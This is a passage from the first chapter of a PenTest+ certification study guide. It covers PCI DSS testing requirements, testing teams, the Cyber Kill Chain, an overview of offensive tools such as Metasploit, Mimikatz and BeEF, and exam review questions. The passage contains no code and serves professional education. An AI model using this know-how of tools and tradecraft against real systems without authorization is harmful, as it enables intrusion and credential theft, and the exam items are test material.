+SQL injection, buffer overflow, insecure cryptographic storage, insecure communications, improper error handling, cross-site scripting, improper access controls, cross-site request forgery, broken authentication, and other “high risk” vulnerabilities.   
+ That section of PCI DSS provides a useful set of requirements for anyone conducting 
+a penetration test. It’s also a nice blueprint for penetration testing, even for organizations 
+that don’t have PCI DSS compliance obligations. 
+ The standard goes on to include four additional requirements that describe the frequency 
+and scope of penetration tests: 
+ 11.3.1. Perform  external   penetration testing at least annually and after 
+any significant infrastructure or application upgrade or modification (such as an operating system upgrade, a sub-network added to the environment, or a web server added to the environment).   
+ 11.3.2 Perform  internal   penetration testing at least annually and after any 
+significant infrastructure or application upgrade or modification (such as 
+an operating system upgrade, a sub-network added to the environment, or a web server added to the environment).   
+ 11.3.3. Exploitable vulnerabilities found during penetration testing are 
+corrected and the testing is repeated to verify the corrections.   
+ 11.3.4 If segmentation is used to isolate the CDE from other networks, 
+perform penetration tests at least annually and after any changes to segmentation controls/methods to verify that the segmentation methods are operational and effective, and isolate all out-of-scope systems from systems in the CDE.   
+
+8 Chapter 1 ■ Penetration Testing
+ Again, while these requirements are only mandatory for organizations subject to PCI DSS, 
+they provide an excellent framework for any organization attempting to plan the frequency 
+and scope of their own penetration tests. We’ll cover compliance requirements for penetra-tion testing in greater detail in Chapter 2, “Planning and Scoping Penetration Tests.” 
+      
+ Organizations that must comply with PCI DSS should also read the detailed 
+Information Supplement: Penetration Testing Guidance   available from the PCI 
+Security Standards Council at  www.pcisecuritystandards.org/documents/
+Penetration-Testing-Guidance-v1_1.pdf  . This document covers in great 
+detail how organizations should interpret these requirements.      
+ Who Performs Penetration Tests? 
+ Penetration testing is a highly skilled discipline, and organizations often try to have 
+experienced penetration testers for their testing efforts. Given that you’re reading this book and are preparing for the PenTest+ certifi  cation, you likely already understand and recognize this. 
+ If you don’t have experience conducting penetration tests, that doesn’t mean that all 
+hope is lost. You may be able to participate in a test under the mentorship of an experienced penetration tester, or you may be able to conduct penetration testing in your organization simply because there’s nobody with experience available to conduct the test. 
+ Penetration tests may be conducted by either internal teams, comprising cybersecurity 
+employees from the organization being tested, or external teams, comprising contractors.  
+ Internal Penetration Testing Teams 
+ Internal penetration testing teams consist of cybersecurity professionals from within the organization who conduct penetration tests on the organization’s systems and applications. These teams may be dedicated to penetration testing on a full-time basis or they may be convened periodically to conduct tests on a part-time basis. 
+ There are two major benefi  ts of using internal teams to conduct penetration testing. 
+First, they have contextual knowledge of the organization that can improve the effective-ness of testing by providing enhanced subject matter expertise. Second, it’s generally less expensive to conduct testing using internal employees than it is to hire a penetration testing fi  rm, provided that you have enough work to keep your internal team busy! 
+ The primary disadvantages to using internal teams to conduct penetration testing stem 
+from the fact that you are using internal employees. These individuals may have helped to design and implement the security controls that they are testing, which may introduce con-scious or unconscious bias toward demonstrating that those controls are secure. Similarly, the fact that they were involved in designing the controls may make it more diffi  cult for them to spot potential fl  aws that could provide a foothold for an attacker. 
+
+Who Performs Penetration Tests?  9
+        
+ There’s a little bit of tricky language surrounding the use of the words 
+internal   and  external   when it comes to penetration tests. If you see these 
+words used on the exam (or in real life!), be sure that you understand the context. Internal penetration tests may refer either to tests conducted by internal teams (as described in this section) or to tests conducted from an internal network perspective. The latter tests are designed to show what activity a malicious insider could engage in and may be conducted by either internal or external teams. Similarly, an external penetration test may refer to a test that is conducted by an external team or a test that is conducted from an external network perspective.   
+ If you do choose to use an internal penetration testing team, it is important to recognize 
+that team members might be limited by a lack of independence. If at all possible, the pen-
+etration testing team should be organizationally separate from the cybersecurity team that designs and operates controls. However, this is usually not possible in any but the largest organizations due to staffi  ng constraints.   
+ External Penetration Testing Teams 
+ External penetration testing teams are hired for the express purpose of performing a penetra-tion test. They may come from a general cybersecurity consulting fi  rm or one that specializes in penetration testing. These individuals are usually highly skilled at conducting penetration tests because they perform these tests all day, every day. When you hire a professional pen-etration testing team, you generally benefi  t from the use of very talented attackers. 
+        
+ If you are subject to regulatory requirements that include penetration test-
+ing, be sure to understand how those requirements impact your selection of a testing team.   
+ External penetration testing teams also generally bring a much higher degree of inde-
+pendence than internal teams. However, organizations using an external team should still 
+be aware of any potential confl  icts of interest the testers may have. It might not be the best idea to hire the cybersecurity consultants that helped you design and implement your secu-rity controls to perform an independent test of those controls. They may be inclined to feel that any negative report they provide is a refl  ection on the quality of their own work.   
+ Selecting Penetration Testing Teams 
+ Penetration testing is not a one-time process. While organizations may wish to require pen-etration testing for new systems upon deployment, it is important to repeat those tests on a periodic basis for three reasons. 
+ First, the technology environment changes. Systems are reconfi  gured, patches are 
+applied, updates and tweaks are made on a regular basis. Considered in isolation, each of 
+
+10 Chapter 1 ■ Penetration Testing
+these changes may have only a minor impact on the environment and may not reach the 
+threshold for triggering a “signifi  cant change” penetration test, but collectively they may change the security posture of the environment. Periodic penetration tests have a good chance of detecting security issues introduced by those environmental changes. 
+ Second, attack techniques evolve over time as well, and updated penetration tests should 
+refl  ect changing attack techniques. A system developed and tested today may receive a clean bill of health, but the exact same system tested two years from now may be vulnerable to an attack technique that simply wasn’t known at the time of the initial test. 
+ Finally, each team member brings a unique set of skills, talents, and experiences to the 
+table. Different team members may approach the test in different ways, and a team con-ducting a follow-on test differently may discover a vulnerability that went unnoticed by the initial team. To maximize your chances of discovering these issues, you should take care when you select the members of a penetration testing team. When possible, rotating team members so they are testing systems, environments, and applications that they have never tested before helps bring a fresh perspective to each round of penetration tests.    
+ The CompTIA Penetration 
+Testing Process 
+ The CompTIA PenTest+ curriculum divides the penetration testing process into fi  ve stages, 
+as shown in Figure   1.3  . 
+     Figure   1.3   CompTIA penetration testing stages  
+Planning and
+Scoping Information
+Gathering and
+Vulnerability
+Identiﬁcation Attacking and
+ExploitingReporting and
+Communicating
+Results  
+ This process captures the major activities involved in conducting a penetration test and 
+will be the way that we approach organizing the content in the remainder of this book. 
+        
+ If you look at CompTIA’s PenTest+ Certification exam Objectives docu-
+ment, you’ll find that there are actually five domains of material covered by the exam. The four domains shown in Figure   1.3   each map to one of the stages of the penetration testing process. Domain 4 is titled “Penetration Testing Tools” and includes coverage of the many tools used during all stages of the penetration testing process. Rather than group these tools into a separate chapter, we’ve included coverage of all of them throughout the book, discussing each tool at the stage where it is used, along with the relevant topics.    
+
+The CompTIA Penetration Testing Process  11
+Planning and Scoping
+The military has a saying that resonates in the world of cybersecurity: “Prior planning 
+prevents poor performance!” While this sentiment is true for almost any line of work, it’s especially important for penetration testing. Testers and their clients must have a clear understanding of what will occur during the penetration test, outline clear rules of engagement, and decide what systems, data, processes, and activities are within the authorized scope of the test. There’s a fine line between penetration testing and hacking, and a written statement of work that includes clear authorization for penetration testing activities is crucial to ensuring that testers stay on the right side of the law and meet client expectations.
+We cover this topic in great detail in Chapter 2. Specifically, you’ll learn how to meet the 
+four objectives of this domain:
+■ ■Explain the importance of planning for an engagement.
+■ ■Explain key legal concepts.
+■ ■Explain the importance of scoping an engagement properly.
+■ ■Explain the key aspects of compliance-based assessments.
+Information Gathering and Vulnerability  
+Identification
+Once a penetration testing team has a clearly defined scope and authorization to proceed 
+with their work, they move on to the reconnaissance phase. During this stage, they gather as much information as possible about the target environment and perform testing designed to identify vulnerabilities in that environment.
+This information gathering process is crucial to the remainder of the penetration test, 
+as the vulnerabilities identified during this stage provide the road map for the remainder of the test, highlighting weak links in an organization’s security chain and potential paths of entry for attackers.
+We cover information gathering and vulnerability identification across four chapters of 
+this book. In Chapter 3, “Information Gathering,” you’ll learn about the use of open-source intelligence and the Nmap scanning tool. In Chapter 4, “Vulnerability Scanning,” we begin a two-chapter deep dive into vulnerability scanning, perhaps the most important informa-tion gathering tool available to penetration testers. Chapter 4 covers how testers can design and perform vulnerability scans. In Chapter 5, “Analyzing Vulnerability Scans,” we move on to the analysis of vulnerability reports and their application to the penetration testing process. Finally, in Chapter 6, “Exploit and Pivot,” we discuss how to apply information learned during scans and exploit vulnerabilities. Together, these chapters cover the five objectives of this domain: 
+■ ■Given a scenario, conduct information gathering using appropriate techniques.
+■ ■Given a scenario, perform a vulnerability scan.
+
+12 Chapter 1 ■ Penetration Testing
+■ ■   Given a scenario, analyze vulnerability scan results. 
+■ ■   Explain the process of leveraging information to prepare for exploitation. 
+■ ■   Explain weaknesses related to specialized systems.   
+        
+ As you plan your cybersecurity certification journey, you should know 
+that there is significant overlap between the material covered in this domain and the material covered in Domain 2 (which is Vulnerability Management) of the Cybersecurity Analyst+ (CySA+) exam. There is also quite a bit of overlap between the basic security concepts and tools covered by both exams. If you successfully pass the PenTest+ exam, you might want to consider immediately moving on to the CySA+ exam because you’ll already have mastered about a third of the material cov-ered on that test.     
+ Attacking and Exploiting 
+ After developing a clear testing plan and conducting reconnaissance activities, penetration 
+testers fi  nally get the opportunity to move on to what most of us consider the fun stuff! It’s time to break out the white hat and attempt to exploit the vulnerabilities discovered dur-ing reconnaissance and penetrate an organization’s network as deeply as possible, staying within the bounds established in the rules of engagement. 
+ The specifi  c attack techniques used during a penetration test will vary based upon the 
+nature of the environment and the scope agreed to by the client, but there are some com-mon techniques used in most tests. Half of this book is dedicated to exploring each of those topics in detail. 
+ In Chapter 6, “Exploit and Pivot,” you’ll learn how attackers establish a foot-
+hold on a network and then try to leverage that initial breach to gain as much access as possible. Chapter 7, “Exploiting Network Vulnerabilities,” dives into attack techniques that focus on network devices and protocols. Chapter 9, “Exploiting Application Vulnerabilities,” is about software attacks, while Chapter 10, “Exploiting Host Vulnerabilities,” examines issues on servers and endpoints. Chapter 8, “Exploiting Physical and Social Vulnerabilities,” reminds us that many vulnerabilities aren’t techni-cal at all and that a penetration test that gains physical access to a facility or compro-mises members of an organization’s staff can be even more dangerous than those that arrive over a network. 
+ Finally, Chapter 11, “Scripting for Penetration Testing,” covers a topic that’s extremely 
+important to penetration testers: applying coding skills to automate aspects of a penetra-tion test. While this chapter won’t turn you into a software developer, it will introduce you to the analysis of basic penetration testing scripts written in Bash, Python, Ruby, and PowerShell. 
+
+The Cyber Kill Chain  13
+Combined, these chapters cover the seven objectives of this domain:
+■ ■Compare and contrast social engineering attacks.
+■ ■Given a scenario, exploit network-based vulnerabilities.
+■ ■Given a scenario, exploit wireless and RF-based vulnerabilities.
+■ ■Given a scenario, exploit application-based vulnerabilities.
+■ ■Given a scenario, exploit local host vulnerabilities.
+■ ■Summarize physical security attacks related to facilities.
+■ ■Given a scenario, perform post-exploitation techniques.
+Reporting and Communicating Results
+Once the glamor and excitement of the attack and exploitation phase passes, the work of 
+the penetration testing team is not yet complete. A key requirement for a successful pen -
+etration test is that it provide useful information to the client about the security of their information technology environment. This should come in the form of clear, actionable  
+recommendations for implementing new security controls and enhancing existing controls.
+Chapter 12, “Reporting and Communication,” explains the best practices for sharing 
+penetration testing results with clients. Specifically, it covers the four objectives of this domain:
+■ ■Given a scenario, use report writing and handling best practices.
+■ ■Explain post-report delivery activities.
+■ ■Given a scenario, recommend mitigation strategies for discovered vulnerabilities.
+■ ■Explain the importance of communication during the penetration testing process.
+The Cyber Kill Chain
+The CompTIA penetration testing model described in the previous sections is an important way for penetration testers to structure their activities. There is an equally important coun-terpart to this model that describes how sophisticated attackers typically organize their work: the Cyber Kill Chain model. This approach, pioneered by Lockheed Martin, consists of the seven stages shown in Figure 1.4.
+Cybersecurity professionals seeking to adopt the hacker mind-set can only do so if 
+they understand how attackers plan and structure their work. The Cyber Kill Chain provides this model. As you seek to reconcile it with the CompTIA process, you might choose to think of it as expanding the Information Gathering and Vulnerability 
+
+14 Chapter 1  ■ Penetration Testing
+Captain Chesley “Sully” Sullenberger recently gave a talk on his heroic landing of 
+US Airways Flight 1549 on New York’s Hudson River in January 2009. In addition to 
+being an outstanding pilot, Sully is also a noted expert on aviation safety. One portion of his talk particularly resonated with this author and made him think of the Cyber Kill Chain. When describing the causes of aviation accidents, Sully said, “Accidents don’t happen as the result of a single failure. They occur as the result of a series of unexpected events.”
+Security incidents follow a similar pattern, and penetration testers must be conscious 
+of the series of events that lead to cybersecurity failures. The Cyber Kill Chain illus -
+trates this well, showing the many stages of failure that must occur before a successful breach.Figure 1.4   The Cyber Kill Chain model
+COMMAND & CONTROL (C2)1234567
+RECONNAISSANCE DELIVERY INSTALLATION ACTIONS ON OBJECTIVES
+EXPLOITATION WEAPONIZATION
+Source: Lockheed MartinIdentification and Attacking and Exploiting stages into seven more detailed steps, as shown in Figure 1.5.
+
+The Cyber Kill Chain  15
+Figure 1.5   Cyber Kill Chain in the context of the CompTIA model
+COMMAND & CONTROL (C2)1234567
+RECONNAISSANCE DELIVERY INSTALLATION ACTIONS ON OBJECTIVES
+EXPLOITATION WEAPONIZATIONPlanning and
+Scoping Information
+Gathering and
+Vulnerability
+Identiﬁcation Attacking and
+ExploitingReporting and
+Communicating
+Results  
+Reconnaissance
+The reconnaissance phase of the Cyber Kill Chain maps directly to the Information 
+Gathering and Vulnerability Identification phase of the penetration testing process. During this phase, attackers gather open-source intelligence and conduct initial scans of the target environment to detect potential avenues of exploitation.
+Weaponization
+After completing the Reconnaissance phase of an attack, attackers move into the remaining six steps, which expand upon the Attacking and Exploiting phase of the penetration testing process.
+
+16 Chapter 1  ■ Penetration Testing
+The first of these phases is Weaponization. During this stage, the attackers develop a 
+specific attack tool designed to exploit the vulnerabilities identified during reconnaissance. 
+They often use automated toolkits to develop a malware strain specifically tailored to infil-trate their target.
+Delivery
+After developing and testing their malware weapon, attackers next must deliver that mal-ware to the target. This may occur through a variety of means, including exploiting a network or application vulnerability, conducting a social engineering attack, distributing malware on an infected USB drive or other media, sending it as an email attachment, or through other means.
+Exploitation
+Once the malware is delivered to the target organization, the attacker or the victim takes some action that triggers the malware’s payload, beginning the Exploitation phase of the Cyber Kill Chain. During this phase, the malware gains access to the targeted system. This may occur when the victim opens a malicious file or when the attacker exploits a vulnerability over the network or otherwise gains a foothold on  
+the target network.
+Installation
+The initial malware installation is designed only to enable temporary access to the tar -
+get system. During the next phase of the Cyber Kill Chain, Installation, the attacker uses the initial access provided by the malware to establish permanent, or persistent, access to the target system. For this reason, many people describe the objective of this phase as establishing persistence in the target environment. Attackers may establish persistence by creating a back door that allows them to return to the system at a later date, by creating Registry entries that reopen access once an administrator closes it, or by installing a web shell that allows them to access the system over a standard HTTPS connection.
+Command and Control
+After establishing persistent access to a target system and network, the attacker may then use a remote shell or other means to remotely control the compromised system. The attacker may manually control the system using the shell or may connect it to an automated command-and-control (C2C) network that provides it instructions. This  
+automated approach is common in distributed denial of service (DDoS) attacks where the attacker simultaneously directs the actions of thousands of compromised systems, known as a botnet.
+
+Tools of the Trade  17
+Actions on Objectives
+With an establishing command-and-control mechanism in place, the attacker may then 
+use the system to advance the original objectives of their attack. This may involve pivoting from the compromised system to other systems operated by the same organization, effec-tively restarting the Cyber Kill Chain.
+The Actions on Objectives stage of the attack may also include the theft of sensitive infor-
+mation, the unauthorized use of computing resources to engage in denial of service attacks or mine cryptocurrency, or the unauthorized modification or deletion of information.
+Tools of the Trade
+Penetration testers use a wide variety of tools as they conduct their testing. The specific tools chosen for each assessment will depend upon the background of the testers, the nature of the target environment, the rules of engagement, and many other factors.
+The PenTest+ exam requires that candidates understand the purposes of a wide variety of 
+tools. In fact, the official exam objectives include a listing of over 50 tools that you’ll need to understand before taking the exam. While you do need to be familiar with these tools, you don’t need to be an expert in their use. The official exam objective for these tools says that you must be able to “Compare and contrast various use cases of tools.” It then goes on to state that “The intent of this objective is NOT to test specific vendor feature sets.”
+This guidance can be frustrating and confusing for test candidates. As you prepare for 
+the exam, you should certainly understand the purpose of each tool. Table 1.1 provides a summary of the tools, broken out by the categories used in the exam objectives. You should be able to describe the purpose of each of these tools in a coherent sentence.
+Additionally, the exam objectives include a series of use cases. You should be able to 
+read a scenario covering one of these use cases and then name the appropriate tool(s) for meeting each objective. These use cases include the following topics: 
+■ ■Reconnaissance
+■ ■Enumeration
+■ ■Vulnerability scanning
+■ ■Credential attacks (offline password cracking and brute-forcing services)
+■ ■Persistence
+■ ■Configuration compliance
+■ ■Evasion
+■ ■Decompilation
+■ ■Forensics
+■ ■Debugging
+■ ■Software assurance
+
+18 Chapter 1  ■ Penetration Testing
+In the remainder of this chapter, you’ll learn about some of these tools at a very high 
+level. We will then revisit each tool and use case as we progress through the remainder 
+of the book. You’ll find references in the following sections that help you locate the more detailed explanations of each tool later in the book.
+Table 1.1   Penetration testing tools covered by the PenTest+ exam
+Scanners
+Nikto
+OpenVASsqlmapNessusNmap
+OSINT
+WHOISNslookupFOCAtheHarvesterShodanMaltegoRecon-ngCensys
+Remote Access Tools
+Secure Shell (SSH)NcatNe
+TCAT
+ProxychainsCredential Testing Tools
+HashcatMedusaHydraCeWLJohn the RipperCain and AbelMimikatzPatatorDirBusterW3AF
+Wireless
+Aircrack-ngKismetWiFite
+Networking Tools
+WiresharkHping
+Debuggers
+OllyDbg
+
+Tools of the Trade  19
+Immunity Debugger
+GDBWinDbgIDA
+Web Proxies
+OWASP ZAPBurp Suite
+Mobile Tools
+DrozerAPKXAPK Studio
+Software Assurance
+FindBugs/find-sec-bugs
+PeachAFLSonarQubeYASCA
+Social Engineering Tools
+S
+eT
+BeeF
+Miscellaneous Tools
+SearchSploitPowerSploitResponderImpacket
+empire
+Metasploit framework
+You’ll want to return to Table 1.1 as a reference as you continue through your test prep-
+aration. It’s also a great review sheet to use the night before you take the exam.
+Now, let’s discuss these tools briefly in the context of the penetration testing process. 
+We’re going to deviate from the CompTIA categories a bit here to help put this information 
+into the easiest context for you to understand. Remember, this is just an overview and we’ll return to each of these tools later in the book.
+Reconnaissance
+During the Information Gathering and Vulnerability Identification phase of a penetra-tion test, the testing team spends a large amount of time gathering information. Most of this information is collected using open-source intelligence (OSINT) tools and techniques that simply comb through publicly available information for organizational and technical details that might prove useful during the penetration test.
+
+20 Chapter 1 ■ Penetration Testing
+ There are a variety of tools that assist with this OSINT collection: 
+■ ■WHOIS   tools gather information from public records about domain ownership. 
+■ ■    Nslookup   tools help identify the IP addresses associated with an organization. 
+■ ■    theHarvester   scours search engines and other resources to find email addresses, 
+employee names, and infrastructure details about an organization. 
+■ ■    Recon-ng   is a modular web reconnaissance framework that organizes and manages 
+OSINT work. 
+■ ■    Censys   is a web-based tool that probes IP addresses across the Internet and then pro-
+vides penetration testers with access to that information through a search engine. 
+■ ■    FOCA   (Fingerprinting Organizations with Collected Archives) is an open-source tool 
+used to find metadata within Office documents, PDFs, and other common file formats. 
+■ ■    Shodan   is a specialized search engine to provide discovery of vulnerable Internet of 
+Things (IoT) devices from public sources. 
+■ ■    Maltego   is a commercial product that assists with the visualization of data gathered 
+from OSINT efforts.   
+ In addition to these OSINT tools, penetration testers must be familiar with the Nmap 
+network scanning tool. Nmap is the most widely used network port scanner and is a part 
+of almost every cybersecurity professional’s toolkit. 
+ You’ll fi  nd coverage of all of these tools in Chapter 3, “Information Gathering.” 
+        
+ In most cases, you don’t need to know the detailed use of cybersecurity 
+tools covered by the PenTest+ exam. However, Nmap is an exception to this general rule. You do need to know the syntax and common options used with Nmap, as they are described in an exam objective. Don’t worry; you’ll learn everything you need to know in Chapter 3.     
+ Vulnerability Scanners 
+ Vulnerability scanners also play an important role in the information gathering stages of a 
+penetration test. Once testers have identifi  ed potential targets, they may use vulnerability scanners to probe those targets for weaknesses that might be exploited during future stages of the test. 
+ You’ll need to be familiar with four specifi  c vulnerability scanning tools for the exam: 
+■ ■Nessus   is a commercial vulnerability scanning tool used to scan a wide variety of 
+devices. 
+■ ■OpenVAS   is an open-source alternative to commercial tools such as Nessus. OpenVAS 
+also performs network vulnerability scans. 
+■ ■Sqlmap   is an open-source tool used to automate SQL injection attacks against web 
+applications with database backends. 
+■ ■Nikto   and  W3AF   are open-source web application vulnerability scanners.   
+
+Tools of the Trade  21
+You’ll learn more about these tools in Chapter 4, “Vulnerability Scanning,” and Chapter 5, 
+“Analyzing Vulnerability Scans.”
+Social Engineering
+Social engineering plays an important role in many attacks. As penetration testers move 
+into the Attacking and Exploiting phase of their work, they often begin with social engi-neering attacks to harvest credentials.
+The PenTest+ exam includes coverage of two toolkits used by social engineers:
+■ ■The Social Engineer Toolkit (SET)  provides a framework for automating the social 
+engineering process, including sending spear phishing messages, hosting fake websites, and collecting credentials.
+■ ■Similarly, the Browser Exploitation Framework ( BeEF ) provides an automated toolkit 
+for using social engineering to take over a victim’s web browser.
+Both of these tools are described in more detail in Chapter 8, “Exploiting Physical and 
+Social Vulnerabilities.”
+Credential-Testing Tools
+If attackers aren’t able to gain access to credentials through social engineering techniques, they may be able to use tools to reverse engineer hashed passwords.
+The PenTest+ exam includes coverage of a large set of tools designed to assist with these 
+activities:
+■ ■Hashcat , John the Ripper , Hydra , Medusa , Patator , and Cain and Abel are password 
+cracking tools used to reverse engineer hashed passwords stored in files.
+■ ■CeWL  is a custom wordlist generator that searches websites for keywords that may be 
+used in password guessing attacks.
+■ ■Mimikatz  retrieves sensitive credential information from memory on Windows systems.
+■ ■DirBuster  is a brute-forcing tool used to enumerate files and directories on a web 
+server.
+We’ll cover all of these tools in more detail in Chapter 10, “Exploiting Host 
+Vulnerabilities.”
+Debuggers
+Debugging tools provide insight into software and assist with reverse engineering activities. Penetration testers preparing for the exam should be familiar with five debugging tools:
+■ ■Immunity Debugger  is designed specifically to support penetration testing and the 
+reverse engineering of malware.
+■ ■GDB  is a widely used open-source debugger for Linux that works with a variety of 
+programming languages.
+
+22 Chapter 1  ■ Penetration Testing
+■ ■OllyDbg  is a Windows debugger that works on binary code at the assembly language 
+level.
+■ ■WinDbg  is another Windows-specific debugging tool that was created by Microsoft.
+■ ■IDA is a commercial debugging tool that works on Windows, Mac, and Linux 
+platforms.
+In addition to decompiling traditional applications, penetration testers also may find 
+themselves attempting to exploit vulnerabilities on mobile devices. You should be familiar 
+with three mobile device security tools for the exam.
+■ ■Drozer is a security audit and attack framework for Android devices and apps.
+■ ■APKX  and APK Studio  decompile Android application packages (APKs).
+We’ll provide detailed coverage of these tools in Chapter 9, “Exploiting Application 
+Vulnerabilities.”
+Software Assurance
+In addition to debuggers, penetration testers also make use of other software assurance and testing tools. Some that you’ll need to be familiar with for the exam include:
+■ ■FindBugs and find-sec-bugs  are Java software testing tools that perform static analysis 
+of code.
+■ ■Peach  and AFL  are fuzzing tools that generate artificial input designed to test 
+applications.
+■ ■SonarQube  is an open-source continuous inspection tool for software testing.
+■ ■YASCA  (Yet Another Source Code Analyzer) is another open-source software testing 
+tool that includes scanners for a wide variety of languages. YASCA leverages FindBugs, among other tools.
+You’ll learn more about each of these tools in Chapter 9, “Exploiting Application 
+Vulnerabilities.”
+Network Testing
+In addition to exploiting software vulnerabilities, penetration testers also often exploit flaws in networks as they seek access to systems.
+■ ■Wireshark  is a protocol analyzer that allows penetration testers to eavesdrop on and 
+dissect network traffic.
+■ ■Hping  is a command-line tool that allows testers to artificially generate network 
+traffic.
+■ ■Aircrack-ng,  WiFite , and Kismet  are wireless network security testing tools.
+You’ll learn more about each of these tools in Chapter 7, “Exploiting Network 
+Vulnerabilities.”
+
+Summary  23
+Remote Access
+After gaining initial access to a network, penetration testers seek to establish persistence so 
+that they may continue to access a system. These are some of the tools used to assist with this task:
+■ ■Secure Shell (SSH) provides secure encrypted connections between systems.
+■ ■Ncat  and N ETCAT  provide an easy way to read and write data over network 
+connections.
+■ ■Proxychains allows testers to force connections through a proxy server where they may be inspected and altered before being passed on to their final destination.
+You’ll learn more about each of these tools in Chapter 10, “Exploiting Host 
+Vulnerabilities.”
+Exploitation
+As attackers work their way through a network, they use a variety of exploits to compromise new systems and escalate the privileges they have on systems they’ve already compromised. Exploitation toolkits make this process easy and automated. For the exam, you should be familiar with the following exploitation tools:
+■ ■Metasploit  is, by far, the most popular exploitation framework and supports thousands 
+of plug-ins covering different exploits.
+■ ■SearchSploit  is a command-line tool that allows you to search through a database of 
+known exploits.
+■ ■PowerSploit  and Empire  are Windows-centric sets of PowerShell scripts that may be 
+used to automate penetration testing tasks.
+■ ■Responder is a toolkit used to answer NetBIOS queries from Windows systems on a network.
+■ ■Impacket  is a set of network tools that provide low-level access to network protocols.
+You’ll learn more about each of these tools in Chapter 6, “Exploit and Pivot.”
+Summary
+Penetration testing is an important practice that allows cybersecurity professionals to assess the security of environments by adopting the hacker mind-set. By thinking like an attacker, testers are able to identify weaknesses in the organization’s security infrastructure and potential gaps that may lead to future security breaches.
+The CompTIA penetration testing process includes four phases: Planning and Coping, 
+Information Gathering and Vulnerability Identification, Attacking and Exploiting, and 
+
+24 Chapter 1  ■ Penetration Testing
+Reporting and Communicating Results. Penetration testers follow each of these phases 
+to ensure that they have a well-designed test that operates using agreed-upon rules of engagement.
+Penetration testers use a wide variety of tools to assist in their work. These are many 
+of the same tools used by cybersecurity professionals, hackers, network engineers, system administrators, and software developers. Tools assist with all stages of the penetration test-ing process, especially information gathering, vulnerability identification, and exploiting vulnerabilities during attacks.
+exam essentials
+The CIA and DAD triads describe the goals of cybersecurity professionals and attackers.    
+Cybersecurity professionals strive to protect the confidentiality, integrity, and availability of information and systems. Attackers seek to undermine these goals by achieving the goals of destruction, alteration, and denial.
+Penetration testing offers several important benefits to the organization.
+  Penetration 
+testing provides knowledge about an organization’s security posture that can’t be obtained 
+elsewhere. It also provides a blueprint for the remediation of security issues. Finally, pen -
+etration tests provide focused information on specific attack targets.
+Penetration testing may be conducted to meet regulatory requirements.   The Payment 
+Card Industry Data Security Standard (PCI DSS) requires that organizations involved in 
+the processing of credit card transactions conduct both internal and external penetration tests on an annual basis.
+Both internal and external teams may conduct penetration tests.
+  Internal teams have the 
+benefit of inside knowledge about the environment. They also operate more cost-effectively 
+than external teams. External penetration testers have the benefit of organizational inde-pendence from the teams who designed and implemented the security controls.
+The penetration testing process consists of four phases.
+  Penetration testers begin in the 
+Planning and Scoping phase, where they develop a statement of work and agree with  
+the client on rules of engagement. They then move into reconnaissance efforts during the Information Gathering and Vulnerability Identification phase. The information collected is then used to conduct attacks during the Attacking and Exploiting phase. During the final phase, Reporting and Communicating Results, the team shares its findings with the target organization.
+Penetration testers use a wide variety of tools during their tests.
+  Tools designed for use by 
+cybersecurity professionals and other technologists may also assist penetration testers in 
+gathering information and conducting attacks. Penetration testers use specialized exploitation frameworks, such as Metasploit, to help automate their work.
+
+Lab exercises 25
+Lab exercises
+Activity 1.1: Adopting the Hacker Mind-Set
+Before we dive into the many technical examples throughout this book, let’s try an example 
+of applying the hacker mind-set to everyday life.
+Think about the grocery store where you normally shop. What are some of the security 
+measures used by that store to prevent the theft of cash and merchandise? What ways can you think of to defeat those controls?
+Activity 1.2: Using the Cyber Kill Chain
+Choose a real-world example of a cybersecurity incident from recent news. Select an exam-ple in which there is a reasonable amount of technical detail publicly available.
+Describe this attack in terms of the Cyber Kill Chain. How did the attacker carry out 
+each step of the process? Were any steps skipped? If there is not enough information avail-able to definitively address an element of the Cyber Kill Chain, offer some assumptions about what may have happened.
+
+26 Chapter 1  ■ Penetration Testing
+Review Questions
+You can find the answers in the Appendix.
+1. Tom is running a penetration test in a web application and discovers a flaw that allows 
+him to shut down the web server remotely. What goal of penetration testing has Tom most directly achieved?
+A.
+ Disclosure
+B. Integrity
+C. Alteration
+D. Denial
+2. Brian ran a penetration test against a school’s grading system and discovered a flaw that 
+would allow students to alter their grades by exploiting a SQL injection vulnerability. What type of control should he recommend to the school’s cybersecurity team to prevent students from engaging in this type of activity?
+A.
+ Confidentiality
+B. Integrity
+C. Alteration
+D. Availability
+3. Edward Snowden gathered a massive quantity of sensitive information from the National 
+Security Agency and released it to the media. What type of attack did he wage?
+A. Disclosure
+B. Denial
+C. Alteration
+D. Availability
+4. Assuming no significant changes in an organization’s cardholder data environment, how 
+often does PCI DSS require that a merchant accepting credit cards conduct penetration  testing?
+A.
+ Monthly
+B. Semiannually
+C. Annually
+D. Biannually
+5. Which one of the following is NOT a benefit of using an internal penetration testing team?A.
+ Contextual knowledge
+B. Cost
+
+Review Questions  27
+C. Subject matter expertise
+D. Independence
+6. Which one of the following is NOT a reason to conduct periodic penetration tests of systems 
+and applications?
+A. Changes in the environment
+B. Cost
+C. Evolving threats
+D. New team members
+7. Rich recently got into trouble with a client for using an attack tool during a penetration test 
+that caused a system outage. During what stage of the penetration testing process should Rich and his clients have agreed upon the tools and techniques that he would use during  the test?
+A.
+ Planning and Scoping
+B. Information Gathering and Vulnerability Identification
+C. Attacking and Exploiting
+D. Reporting and Communication Results
+8. Which one of the following steps of the Cyber Kill Chain does not map to the Attacking 
+and Exploiting stage of the penetration testing process?
+A. Weaponization
+B. Reconnaissance
+C. Installation
+D. Actions on Objectives
+9. Beth recently conducted a phishing attack against a penetration testing target in an attempt 
+to gather credentials that she might use in later attacks. What stage of the penetration test-ing process is Beth in?
+A.
+ Planning and Scoping
+B. Attacking and Exploiting
+C. Information Gathering and Vulnerability Identification
+D. Reporting and Communication Results
+10. Which one of the following security assessment tools is not commonly used during the 
+Information Gathering and Vulnerability Identification phase of a penetration test?
+A. Nmap
+B. Nessus
+C. Metasploit
+D. Nslookup
+
+28 Chapter 1  ■ Penetration Testing
+11. During what phase of the Cyber Kill Chain does an attacker steal information, use comput-
+ing resources, or alter information without permission?
+A. Weaponization
+B. Installation
+C. Actions on Objectives
+D. Command and Control
+12. Grace is investigating a security incident where the attackers left USB drives containing 
+infected files in the parking lot of an office building. What stage in the Cyber Kill Chain describes this action?
+A.
+ Weaponization
+B. Installation
+C. Delivery
+D. Command and Control
+13. Which one of the following is not an open-source intelligence gathering tool?A.
+ WHOIS
+B. Nslookup
+C. Nessus
+D. FOCA
+14. Which one of the following tools is an exploitation framework commonly used by  
+penetration testers?
+A. Metasploit
+B. Wireshark
+C. Aircrack-ng
+D. SET
+15. Which one of the following tools is NOT a password cracking utility?A.
+ OWASP ZAP
+B. Cain and Abel
+C. Hashcat
